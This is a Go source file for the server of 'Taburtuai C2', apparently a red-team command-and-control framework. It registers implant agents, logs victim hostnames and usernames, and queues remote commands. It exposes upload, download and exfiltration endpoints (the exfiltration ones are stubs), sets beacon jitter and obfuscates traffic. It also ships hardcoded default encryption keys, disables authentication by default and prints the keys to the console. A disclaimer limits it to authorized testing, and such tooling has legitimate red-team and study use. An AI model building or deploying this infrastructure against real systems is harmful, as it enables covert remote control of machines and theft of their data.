package main

import (
	"encoding/json"
	"fmt"
	"log"
	"net/http"

	//	"net/http"
	"os"
	"os/signal"

	//	"sort"        // Add this
	"strconv" // Add this
	"syscall"
	"time"

	"github.com/gin-gonic/gin"
	// "github.com/google/uuid"  // Add this (install: go get github.com/google/uuid)
)

// Server configuration
type ServerConfig struct {
	Port          string
	LogLevel      LogLevel
	LogDir        string
	EncryptionKey string
	SecondaryKey  string
	AuthEnabled   bool
	APIKey        string
	MaxAgents     int
	AgentTimeout  time.Duration
}

// Enhanced server structure
type TaburtuaiServer struct {
	config     *ServerConfig
	router     *gin.Engine
	crypto     *CryptoManager
	monitor    *AgentMonitor
	obfuscator *TrafficObfuscator
}

// Response structures
type APIResponse struct {
	Success bool        `json:"success"`
	Message string      `json:"message"`
	Data    interface{} `json:"data,omitempty"`
	Error   string      `json:"error,omitempty"`
}

type AgentListResponse struct {
	Agents []AgentSummary `json:"agents"`
	Total  int            `json:"total"`
}

type AgentSummary struct {
	ID       string    `json:"id"`
	Hostname string    `json:"hostname"`
	Username string    `json:"username"`
	OS       string    `json:"os"`
	Status   string    `json:"status"`
	LastSeen time.Time `json:"last_seen"`
}

// NewTaburtuaiServer creates a new enhanced server
func NewTaburtuaiServer(config *ServerConfig) (*TaburtuaiServer, error) {
	// Initialize logging
	if err := InitLogger(config.LogLevel, config.LogDir); err != nil {
		return nil, fmt.Errorf("failed to initialize logger: %v", err)
	}

	// DEBUG: Log keys being used
	fmt.Printf("[SERVER] Using encryption keys:\n")
	fmt.Printf("[SERVER] Primary: %s\n", config.EncryptionKey)
	fmt.Printf("[SERVER] Secondary: %s\n", config.SecondaryKey)

	// Initialize crypto manager
	crypto, err := NewCryptoManager(config.EncryptionKey, config.SecondaryKey)
	if err != nil {
		return nil, fmt.Errorf("failed to initialize crypto manager: %v", err)
	}

	// Initialize agent monitor
	monitor := NewAgentMonitor(
		30*time.Second,      // heartbeat window
		config.AgentTimeout, // offline window
		10*time.Second,      // check interval
	)

	// Initialize traffic obfuscator
	obfuscator := NewTrafficObfuscator()

	server := &TaburtuaiServer{
		config:     config,
		crypto:     crypto,
		monitor:    monitor,
		obfuscator: obfuscator,
	}

	server.setupRoutes()
	return server, nil
}

// Tambahkan middleware untuk debug
func (s *TaburtuaiServer) debugMiddleware() gin.HandlerFunc {
	return func(c *gin.Context) {
		// Log semua requests
		LogInfo(SYSTEM, fmt.Sprintf("Request: %s %s from %s",
			c.Request.Method, c.Request.URL.Path, c.ClientIP()), "")

		c.Next()

		// Log response status
		LogInfo(SYSTEM, fmt.Sprintf("Response: %d for %s %s",
			c.Writer.Status(), c.Request.Method, c.Request.URL.Path), "")
	}
}

func (s *TaburtuaiServer) errorRecoveryMiddleware() gin.HandlerFunc {
	return gin.CustomRecovery(func(c *gin.Context, recovered interface{}) {
		LogError(SYSTEM, fmt.Sprintf("Panic recovered: %v", recovered), "")

		c.JSON(500, APIResponse{
			Success: false,
			Error:   "Internal server error",
		})
	})
}

// setupRoutes configures all API routes
func (s *TaburtuaiServer) setupRoutes() {
	// Set Gin mode
	if s.config.LogLevel == DEBUG {
		gin.SetMode(gin.DebugMode)
	} else {
		gin.SetMode(gin.ReleaseMode)
	}

	s.router = gin.New()

	// Middleware
	s.router.Use(gin.Logger())
	s.router.Use(gin.Recovery())
	s.router.Use(s.errorRecoveryMiddleware())
	s.router.Use(s.debugMiddleware())
	s.router.Use(s.corsMiddleware())
	s.router.Use(s.authMiddleware())
	s.router.Use(s.loggingMiddleware())

	// API routes
	api := s.router.Group("/api/v1")
	{
		// Agent management
		api.GET("/agents", s.listAgents)
		api.GET("/agents/:id", s.getAgent)
		api.DELETE("/agents/:id", s.removeAgent)

		// Agent communication
		api.POST("/checkin", s.agentCheckin)
		api.GET("/command/:id", s.getCommand)
		api.POST("/result", s.submitResult)

		// Download & Upload
		api.POST("/agent/:id/upload", s.uploadToAgent)
		api.POST("/agent/:id/download", s.downloadFromAgent)

		// File operations
		// api.POST("/upload", s.uploadFile)
		// api.GET("/download/:id/*filepath", s.downloadFile)
		api.POST("/exfiltrate", s.exfiltrateFile)

		// Task scheduling
		api.POST("/schedule", s.scheduleTask)
		api.GET("/tasks/:id", s.getTasks)

		// Monitoring and stats
		api.GET("/stats", s.getStats)
		api.GET("/health", s.healthCheck)
		api.GET("/logs", s.getLogs)
		api.GET("/history/:id", s.getAgentHistory)

		// Command execution
		api.POST("/command", s.executeCommand)
		api.GET("/command/:id/next", s.getNextCommand)
		api.POST("/command/result", s.submitCommandResult)
		api.GET("/command/:id/status", s.getCommandStatus)

		// Agent command management
		api.GET("/agent/:id/commands", s.getAgentCommands)
		api.DELETE("/agent/:id/queue", s.clearAgentQueue)

		// Queue statistics
		api.GET("/queue/stats", s.getQueueStats)
	}

	// Legacy endpoints for backward compatibility
	s.router.GET("/ping", s.legacyPing)
	s.router.GET("/command", s.legacyCommand)
	s.router.POST("/result", s.legacyResult)
	s.router.POST("/upload", s.legacyUpload)
	s.router.GET("/download", s.legacyDownload)
	s.router.GET("/exfil", s.legacyExfil)
	s.router.GET("/schedule", s.legacySchedule)

	// Admin dashboard with template support
	s.router.Static("/static", "./web/static")
	s.router.LoadHTMLGlob("web/templates/*")
	s.router.GET("/", s.dashboard)
}

// Middleware functions
func (s *TaburtuaiServer) corsMiddleware() gin.HandlerFunc {
	return func(c *gin.Context) {
		c.Header("Access-Control-Allow-Origin", "*")
		c.Header("Access-Control-Allow-Methods", "GET, POST, PUT, DELETE, OPTIONS")
		c.Header("Access-Control-Allow-Headers", "Origin, Content-Type, Authorization")

		if c.Request.Method == "OPTIONS" {
			c.AbortWithStatus(204)
			return
		}

		c.Next()
	}
}

func (s *TaburtuaiServer) authMiddleware() gin.HandlerFunc {
	return func(c *gin.Context) {
		if !s.config.AuthEnabled {
			c.Next()
			return
		}

		// Skip auth for health check
		if c.Request.URL.Path == "/api/v1/health" {
			c.Next()
			return
		}

		authHeader := c.GetHeader("Authorization")
		if authHeader == "" {
			c.JSON(401, APIResponse{
				Success: false,
				Error:   "Authorization header required",
			})
			c.Abort()
			return
		}

		expectedAuth := "Bearer " + s.config.APIKey
		if authHeader != expectedAuth {
			c.JSON(401, APIResponse{
				Success: false,
				Error:   "Invalid API key",
			})
			c.Abort()
			return
		}

		c.Next()
	}
}

func (s *TaburtuaiServer) loggingMiddleware() gin.HandlerFunc {
	return func(c *gin.Context) {
		start := time.Now()
		clientIP := c.ClientIP()

		c.Next()

		latency := time.Since(start)
		statusCode := c.Writer.Status()

		LogInfo(SYSTEM, fmt.Sprintf("%s %s %d %v",
			c.Request.Method, c.Request.URL.Path, statusCode, latency), "")

		// Log suspicious activity
		if statusCode >= 400 {
			LogError(AUDIT, fmt.Sprintf("HTTP %d from %s: %s %s",
				statusCode, clientIP, c.Request.Method, c.Request.URL.Path), "")
		}
	}
}

// API handlers
func (s *TaburtuaiServer) listAgents(c *gin.Context) {
	agents := s.monitor.GetAllAgents()

	var agentSummaries []AgentSummary
	for _, agent := range agents {
		summary := AgentSummary{
			ID:       agent.ID,
			Hostname: agent.Hostname,
			Username: agent.Username,
			OS:       agent.OS,
			Status:   string(agent.Status),
			LastSeen: agent.LastSeen,
		}
		agentSummaries = append(agentSummaries, summary)
	}

	response := AgentListResponse{
		Agents: agentSummaries,
		Total:  len(agentSummaries),
	}

	c.JSON(200, APIResponse{
		Success: true,
		Data:    response,
	})
}

func (s *TaburtuaiServer) getAgent(c *gin.Context) {
	agentID := c.Param("id")

	agent, exists := s.monitor.GetAgent(agentID)
	if !exists {
		c.JSON(404, APIResponse{
			Success: false,
			Error:   "Agent not found",
		})
		return
	}

	c.JSON(200, APIResponse{
		Success: true,
		Data:    agent,
	})
}

func (s *TaburtuaiServer) removeAgent(c *gin.Context) {
	agentID := c.Param("id")

	s.monitor.RemoveAgent(agentID)

	c.JSON(200, APIResponse{
		Success: true,
		Message: fmt.Sprintf("Agent %s removed", agentID),
	})
}

func (s *TaburtuaiServer) agentCheckin(c *gin.Context) {
	var checkinData map[string]interface{}
	if err := c.ShouldBindJSON(&checkinData); err != nil {
		c.JSON(http.StatusBadRequest, APIResponse{ // Menggunakan http.StatusBadRequest
			Success: false,
			Error:   "Invalid checkin data format: " + err.Error(),
		})
		return
	}

	// --- MODIFIKASI UTAMA DI SINI ---
	// Periksa apakah data terenkripsi menggunakan key "encrypted_payload"
	if encryptedPayload, ok := checkinData["encrypted_payload"].(string); ok && s.crypto != nil {
		LogInfo(SYSTEM, "Received checkin data with 'encrypted_payload', decrypting...", "") //

		decrypted, err := s.crypto.DecryptData(encryptedPayload) //
		if err != nil {
			LogError(SYSTEM, "Failed to decrypt checkin data: "+err.Error(), "") //
			c.JSON(http.StatusBadRequest, APIResponse{
				Success: false,
				Error:   "Failed to decrypt checkin data: " + err.Error(),
			})
			return
		}

		// Penting: Unmarshal data yang sudah didekripsi ke dalam map baru
		// atau timpa checkinData agar berisi data agent yang sebenarnya.
		var decryptedAgentData map[string]interface{}
		if err := json.Unmarshal(decrypted, &decryptedAgentData); err != nil {
			LogError(SYSTEM, "Failed to parse decrypted agent data: "+err.Error(), "") //
			c.JSON(http.StatusBadRequest, APIResponse{
				Success: false,
				Error:   "Failed to parse decrypted agent data: " + err.Error(),
			})
			return
		}
		checkinData = decryptedAgentData                                                    // Gunakan data yang sudah didekripsi untuk proses selanjutnya
		LogInfo(SYSTEM, "Checkin data decrypted successfully from 'encrypted_payload'", "") //
	} else if _, encryptedKeyExists := checkinData["encrypted"]; encryptedKeyExists {
		// Tambahkan log jika key "encrypted" yang lama masih terdeteksi, untuk debugging
		LogWarn(SYSTEM, "Received checkin data with deprecated 'encrypted' key. Please ensure agent uses 'encrypted_payload'.", "") //
		// Jika Anda masih ingin mendukung key "encrypted" untuk sementara:
		// (Logika dekripsi untuk key "encrypted" bisa ditambahkan di sini jika perlu)
		// Namun, untuk konsistensi, sebaiknya agent diupdate.
	}
	// --- AKHIR MODIFIKASI UTAMA ---

	// Register/update agent
	// Sekarang checkinData seharusnya berisi map agent info yang sebenarnya (jika terenkripsi dan berhasil didekripsi)
	// atau map yang dikirim plaintext oleh agent.
	s.monitor.RegisterAgent(checkinData) //

	agentID := ""
	if id, ok := checkinData["id"].(string); ok { // Ini seharusnya berhasil sekarang
		agentID = id
	} else {
		// Jika ID masih tidak ada setelah potensial dekripsi, ada masalah lain.
		// Log ini, meskipun RegisterAgent juga akan melakukan validasi.
		LogError(SYSTEM, "Agent ID missing or not a string in checkinData after potential decryption.", "") //
	}

	LogAgentActivity(agentID, "checkin", c.ClientIP()) //

	// Return any pending commands or config updates
	// Server dapat mengirimkan konfigurasi atau perintah awal di sini jika perlu
	response := map[string]interface{}{
		"status": "ok",
		"config": map[string]interface{}{ // Contoh konfigurasi yang bisa dikirim ke agent
			"interval": s.config.AgentTimeout.Seconds() / 10, // Contoh: beacon interval
			"jitter":   0.3,                                  // Contoh: jitter
		},
		// "commands": []interface{}{}, // Bisa juga langsung mengirim perintah awal
	}

	// Pertimbangkan untuk mengenkripsi respons ini jika agent mengharapkannya
	// (Saat ini agent belum mengharapkan respons checkin terenkripsi)

	c.JSON(http.StatusOK, APIResponse{ // Menggunakan http.StatusOK
		Success: true,
		Message: "Checkin successful", // Tambahkan pesan sukses
		Data:    response,
	})
}

func (s *TaburtuaiServer) getStats(c *gin.Context) {
	stats := s.monitor.GetStats()
	logStats := GlobalLogger.GetStats()

	combinedStats := map[string]interface{}{
		"agents": stats,
		"logs":   logStats,
		"server": map[string]interface{}{
			"uptime":   time.Since(serverStartTime).String(),
			"version":  "2.0.0-phase1",
			"features": []string{"encryption", "monitoring", "logging", "cli"},
		},
	}

	c.JSON(200, APIResponse{
		Success: true,
		Data:    combinedStats,
	})
}

func (s *TaburtuaiServer) healthCheck(c *gin.Context) {
	health := map[string]interface{}{
		"status":    "healthy",
		"timestamp": time.Now(),
		"components": map[string]string{
			"logger":  "ok",
			"monitor": "ok",
			"crypto":  "ok",
		},
	}

	c.JSON(200, APIResponse{
		Success: true,
		Data:    health,
	})
}

func (s *TaburtuaiServer) getLogs(c *gin.Context) {
	countStr := c.DefaultQuery("count", "100")
	count, err := strconv.Atoi(countStr)
	if err != nil {
		count = 100
	}

	logs := GlobalLogger.GetRecentLogs(count)

	c.JSON(200, APIResponse{
		Success: true,
		Data:    logs,
	})
}

func (s *TaburtuaiServer) getAgentHistory(c *gin.Context) {
	agentID := c.Param("id")
	countStr := c.DefaultQuery("count", "50")
	count, err := strconv.Atoi(countStr)
	if err != nil {
		count = 50
	}

	history := GlobalLogger.GetCommandHistory(agentID, count)

	c.JSON(200, APIResponse{
		Success: true,
		Data:    history,
	})
}

// Legacy handlers for backward compatibility
func (s *TaburtuaiServer) legacyPing(c *gin.Context) {
	agentID := c.Query("id")
	if agentID == "" {
		agentID = generateAgentID()
	}

	// Create basic agent data
	agentData := map[string]interface{}{
		"id":       agentID,
		"hostname": c.Query("hostname"),
		"username": c.Query("username"),
		"os":       c.Query("os"),
	}

	s.monitor.RegisterAgent(agentData)

	c.String(200, "pong")
}

func (s *TaburtuaiServer) legacyCommand(c *gin.Context) {
	agentID := c.Query("id")
	command := c.Query("cmd")

	if agentID == "" || command == "" {
		c.String(400, "Missing agent ID or command")
		return
	}

	// Record command
	start := time.Now()
	LogCommand(agentID, command, "", true)
	s.monitor.RecordCommand(agentID, command, true, time.Since(start))

	c.String(200, "Command queued")
}

func (s *TaburtuaiServer) legacyResult(c *gin.Context) {
	// Handle command results
	c.String(200, "Result received")
}

func (s *TaburtuaiServer) legacyUpload(c *gin.Context) {
	// Handle file uploads
	c.String(200, "File uploaded")
}

func (s *TaburtuaiServer) legacyDownload(c *gin.Context) {
	// Handle file downloads
	c.String(200, "File downloaded")
}

func (s *TaburtuaiServer) legacyExfil(c *gin.Context) {
	// Handle file exfiltration
	c.String(200, "Exfiltration queued")
}

func (s *TaburtuaiServer) legacySchedule(c *gin.Context) {
	// Handle task scheduling
	c.String(200, "Task scheduled")
}

func (s *TaburtuaiServer) simpleDashboard(c *gin.Context) {
	stats := s.monitor.GetStats()

	html := `<!DOCTYPE html>
<html>
<head>
    <title>Taburtuai C2 Dashboard</title>
    <style>
        body { font-family: Arial, sans-serif; margin: 40px; background: #f5f5f5; }
        .container { max-width: 1200px; margin: 0 auto; background: white; padding: 30px; border-radius: 8px; box-shadow: 0 2px 10px rgba(0,0,0,0.1); }
        .header { text-align: center; margin-bottom: 30px; }
        .stats { display: grid; grid-template-columns: repeat(auto-fit, minmax(200px, 1fr)); gap: 20px; margin: 30px 0; }
        .stat-card { background: #f8f9fa; padding: 20px; border-radius: 6px; text-align: center; }
        .stat-number { font-size: 2em; font-weight: bold; color: #28a745; }
        .stat-label { color: #666; margin-top: 5px; }
        .endpoints { background: #f8f9fa; padding: 20px; border-radius: 6px; margin-top: 20px; }
        .endpoint { font-family: monospace; background: #e9ecef; padding: 8px; margin: 5px 0; border-radius: 4px; }
        .status-online { color: #28a745; }
        .status-offline { color: #dc3545; }
    </style>
</head>
<body>
    <div class="container">
        <div class="header">
            <h1>🚀 Taburtuai C2 Server v2.0</h1>
            <p>Phase 1 Enhanced - Command & Control Dashboard</p>
        </div>
        
        <div class="stats">
            <div class="stat-card">
                <div class="stat-number">%d</div>
                <div class="stat-label">Total Agents</div>
            </div>
            <div class="stat-card">
                <div class="stat-number status-online">%d</div>
                <div class="stat-label">Online Agents</div>
            </div>
            <div class="stat-card">
                <div class="stat-number status-offline">%d</div>
                <div class="stat-label">Offline Agents</div>
            </div>
            <div class="stat-card">
                <div class="stat-number">%d</div>
                <div class="stat-label">Total Commands</div>
            </div>
        </div>
        
        <div class="endpoints">
            <h3>🔗 API Endpoints</h3>
            <div class="endpoint">GET /api/v1/agents - List all agents</div>
            <div class="endpoint">GET /api/v1/agents/{id} - Get agent details</div>
            <div class="endpoint">POST /api/v1/checkin - Agent check-in</div>
            <div class="endpoint">GET /api/v1/stats - Server statistics</div>
            <div class="endpoint">GET /api/v1/health - Health check</div>
            <div class="endpoint">GET /api/v1/logs - Recent logs</div>
        </div>
        
        <div class="endpoints">
            <h3>🖥️ CLI Usage</h3>
            <div class="endpoint">export TABURTUAI_SERVER=http://localhost:%s</div>
            <div class="endpoint">taburtuai-cli agents list</div>
            <div class="endpoint">taburtuai-cli cmd [agent-id] "whoami"</div>
            <div class="endpoint">taburtuai-cli status</div>
        </div>
        
        <div style="text-align: center; margin-top: 30px; color: #666;">
            <p>Server uptime: %s</p>
            <p>⚠️ For educational and authorized testing purposes only</p>
        </div>
    </div>
</body>
</html>`

	c.Header("Content-Type", "text/html")
	c.String(200, html,
		stats["total_agents"],
		stats["online_agents"],
		stats["offline_agents"],
		stats["total_commands"],
		s.config.Port,
		time.Since(serverStartTime).Round(time.Second))
}

func (s *TaburtuaiServer) dashboard(c *gin.Context) {
	stats := s.monitor.GetStats()

	data := gin.H{
		"title":          "Taburtuai C2 Dashboard",
		"total_agents":   stats["total_agents"],
		"online_agents":  stats["online_agents"],
		"offline_agents": stats["offline_agents"],
		"total_commands": stats["total_commands"],
		"server_port":    s.config.Port,
		"uptime":         time.Since(serverStartTime).Round(time.Second).String(),
		"version":        "v2.0 - Phase 1 Enhanced",
	}

	c.HTML(200, "dashboard.html", data)
}

// Stub implementations for missing handlers
func (s *TaburtuaiServer) getCommand(c *gin.Context) {
	c.JSON(200, APIResponse{Success: true, Message: "No pending commands"})
}

func (s *TaburtuaiServer) submitResult(c *gin.Context) {
	c.JSON(200, APIResponse{Success: true, Message: "Result submitted"})
}

func (s *TaburtuaiServer) uploadFile(c *gin.Context) {
	c.JSON(200, APIResponse{Success: true, Message: "File uploaded"})
}

func (s *TaburtuaiServer) downloadFile(c *gin.Context) {
	c.JSON(200, APIResponse{Success: true, Message: "File download started"})
}

func (s *TaburtuaiServer) exfiltrateFile(c *gin.Context) {
	c.JSON(200, APIResponse{Success: true, Message: "Exfiltration queued"})
}

func (s *TaburtuaiServer) scheduleTask(c *gin.Context) {
	c.JSON(200, APIResponse{Success: true, Message: "Task scheduled"})
}

func (s *TaburtuaiServer) getTasks(c *gin.Context) {
	c.JSON(200, APIResponse{Success: true, Data: []interface{}{}})
}

// Start starts the server
func (s *TaburtuaiServer) Start() error {
	// Start monitoring
	s.monitor.Start()

	LogInfo(SYSTEM, fmt.Sprintf("Starting Taburtuai C2 Server on port %s", s.config.Port), "")
	LogInfo(SYSTEM, fmt.Sprintf("Features: encryption=%t, auth=%t, monitoring=true",
		s.crypto != nil, s.config.AuthEnabled), "")

	return s.router.Run(":" + s.config.Port)
}

// Stop gracefully stops the server
func (s *TaburtuaiServer) Stop() {
	LogInfo(SYSTEM, "Stopping Taburtuai C2 Server", "")

	if s.monitor != nil {
		s.monitor.Stop()
	}

	if GlobalLogger != nil {
		GlobalLogger.Close()
	}
}

// Helper functions
func generateAgentID() string {
	return fmt.Sprintf("agent_%d", time.Now().UnixNano())
}

var serverStartTime time.Time

// Main function
func main() {
	serverStartTime = time.Now()

	// Load configuration
	config := &ServerConfig{
		Port:          getEnvOrDefault("PORT", "8080"),
		LogLevel:      INFO,
		LogDir:        getEnvOrDefault("LOG_DIR", "./logs"),
		EncryptionKey: getEnvOrDefault("ENCRYPTION_KEY", "SpookyOrcaC2AES1"),
		SecondaryKey:  getEnvOrDefault("SECONDARY_KEY", "TaburtuaiSecondary"),
		AuthEnabled:   getEnvOrDefault("AUTH_ENABLED", "false") == "true",
		APIKey:        getEnvOrDefault("API_KEY", "your-api-key-here"),
		MaxAgents:     100,
		AgentTimeout:  5 * time.Minute,
	}

	// Parse log level from environment
	if logLevelStr := os.Getenv("LOG_LEVEL"); logLevelStr != "" {
		switch logLevelStr {
		case "DEBUG":
			config.LogLevel = DEBUG
		case "INFO":
			config.LogLevel = INFO
		case "WARN":
			config.LogLevel = WARN
		case "ERROR":
			config.LogLevel = ERROR
		case "CRITICAL":
			config.LogLevel = CRITICAL
		}
	}

	// Create server
	server, err := NewTaburtuaiServer(config)
	if err != nil {
		log.Fatalf("Failed to create server: %v", err)
	}

	// Initialize command queue explicitly
	if commandQueue == nil {
		commandQueue = &CommandQueue{
			queues:  make(map[string][]*Command),
			active:  make(map[string]*Command),
			results: make(map[string]*Command),
		}
		fmt.Println("Command queue initialized")
	}

	// Start command queue cleanup routine (Phase 2A addition)
	startCommandQueueCleanup()

	// Setup graceful shutdown
	c := make(chan os.Signal, 1)
	signal.Notify(c, os.Interrupt, syscall.SIGTERM)

	go func() {
		<-c
		fmt.Println("\nShutting down server...")
		server.Stop()
		os.Exit(0)
	}()

	// Print startup information
	fmt.Printf(`
╔══════════════════════════════════════════════════════════════╗
║                    Taburtuai C2 Server v2.0                 ║
║                        Phase 1 Enhanced                     ║
╠══════════════════════════════════════════════════════════════╣
║ Features:                                                    ║
║ ✓ Enhanced Logging System                                    ║
║ ✓ Agent Health Monitoring                                    ║
║ ✓ Advanced Encryption & Obfuscation                         ║
║ ✓ CLI Interface Support                                      ║
║ ✓ RESTful API                                               ║
║ ✓ Legacy Compatibility                                       ║
╠══════════════════════════════════════════════════════════════╣
║ Server: http://localhost:%s                                ║
║ Logs: %s                                                    ║
║ Auth: %s                                                     ║
╚══════════════════════════════════════════════════════════════╝

`, config.Port, config.LogDir,
		map[bool]string{true: "Enabled", false: "Disabled"}[config.AuthEnabled])

	// Start server
	if err := server.Start(); err != nil {
		log.Fatalf("Server failed to start: %v", err)
	}
}

func getEnvOrDefault(key, defaultValue string) string {
	if value := os.Getenv(key); value != "" {
		return value
	}
	return defaultValue
}
